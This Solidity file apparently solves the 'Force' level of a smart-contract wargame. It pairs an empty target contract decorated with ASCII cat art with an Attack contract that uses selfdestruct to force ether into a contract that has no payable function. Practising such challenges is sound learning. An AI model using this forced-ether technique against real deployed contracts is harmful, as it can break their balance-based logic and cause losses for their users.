// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}


 contract Attack {
     function attack(address payable thecontract) public payable {
         selfdestruct(thecontract);
     }
 }
 
